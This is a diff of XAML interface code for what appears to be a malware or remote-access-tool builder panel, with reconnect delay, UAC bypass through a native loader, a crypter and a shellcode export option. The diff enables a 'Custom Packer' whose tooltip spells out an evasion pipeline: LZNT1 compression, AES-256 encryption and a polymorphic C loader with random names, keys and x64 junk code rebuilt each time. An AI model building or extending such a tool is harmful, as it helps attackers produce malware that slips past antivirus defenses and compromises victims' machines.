@@ -2751,10 +2751,9 @@
                                             <TextBlock x:Name="BldTxtUacWarning" FontSize="10" Foreground="#F59E0B" TextWrapping="Wrap"
                                                        Text="?  UAC bypass uses the native C++ loader ? the crypter will be applied automatically." />
                                         </Border>
-                                        <CheckBox x:Name="BldCustomPacker" Style="{StaticResource SChk}" IsEnabled="False" Margin="0,4,0,0"
-                                                  ToolTip="Custom packer — coming soon">
-                                            <TextBlock x:Name="BldTxtCustomPacker" Text="Custom Packer (coming soon)" FontSize="11"
-                                                       Foreground="{DynamicResource LabelBrush}"/>
+                                        <CheckBox x:Name="BldCustomPacker" Style="{StaticResource SChk}" Margin="0,4,0,0"
+                                                  ToolTip="Open-source C loader: LZNT1 compress → AES-256-CBC encrypt → wrap in a polymorphic C loader with random function names, random key/IV, and inline x64 ASM junk code. Compiled fresh each build with cl.exe. Stacks on top of the closed-source crypter if both are enabled.">
+                                            <TextBlock x:Name="BldTxtCustomPacker" Text="Custom Packer (LZNT1 + AES-256 + x64 ASM junk)" FontSize="11"/>
                                         </CheckBox>
                                     </StackPanel>
                                 </Border>
@@ -2841,7 +2840,7 @@
                                             <TextBlock Text="Delay (ms):" Foreground="{DynamicResource LabelBrush}" FontSize="12" VerticalAlignment="Center" Margin="0,0,8,0" />
                                             <TextBox x:Name="BldReconnectDelay" Style="{StaticResource STxt}" Width="70" Text="5000" />
                                         </StackPanel>
-                                        <WrapPanel Orientation="Horizontal">
+                                        <WrapPanel Orientation="Horizontal" Margin="0,0,0,2">
                                             <Button x:Name="BtnBuild" Width="110" Height="28"
                                                     Style="{StaticResource SGreenBtn}" Click="Build_Click" Margin="0,0,6,4">
                                                 <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
@@ -2849,15 +2848,11 @@
                                                     <TextBlock x:Name="TxtBtnBuild" Text="BUILD" VerticalAlignment="Center"/>
                                                 </StackPanel>
                                             </Button>
-                                            <Button x:Name="BtnBldSave"     Content="SAVE"      Width="64"  Height="28" Margin="0,0,6,4" Style="{StaticResource SBtn}" Click="BldSaveConfig_Click" />
-                                            <Button x:Name="BtnBldCheckAll" Content="CHECK ALL" Width="88"  Height="28" Margin="0,0,6,4" Style="{StaticResource SBtn}" Click="BldCheckAll_Click" />
-                                            <Button x:Name="BtnExportShellcode" Height="28" Margin="0,0,0,4"
-                                                    Style="{StaticResource SBtn}" Click="ExportShellcode_Click">
-                                                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                                                    <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Export.svg'}" Width="13" Height="13" Margin="0,0,5,0" VerticalAlignment="Center"/>
-                                                    <TextBlock x:Name="TxtBtnShellcode" Text="SHELLCODE" VerticalAlignment="Center"/>
-                                                </StackPanel>
-                                            </Button>
+                                            <Button x:Name="BtnBldSave"     Content="SAVE"      MinWidth="64"  Padding="10,0" Height="28" Margin="0,0,6,4" Style="{StaticResource SBtn}" Click="BldSaveConfig_Click" />
+                                            <Button x:Name="BtnBldCheckAll" Content="CHECK ALL" MinWidth="88"  Padding="10,0" Height="28" Margin="0,0,6,4" Style="{StaticResource SBtn}" Click="BldCheckAll_Click" />
+                                            <CheckBox x:Name="BldShellcode" Style="{StaticResource SChk}" VerticalAlignment="Center" Margin="6,0,0,4">
+                                                <TextBlock x:Name="TxtBldShellcode" Text="SHELLCODE" VerticalAlignment="Center"/>
+                                            </CheckBox>
                                         </WrapPanel>
                                         <TextBlock x:Name="TxtBuildStatus" Text="" Foreground="{DynamicResource LabelBrush}"
                                                    FontSize="11" FontFamily="Consolas" TextWrapping="Wrap" Margin="0,12,0,0" />
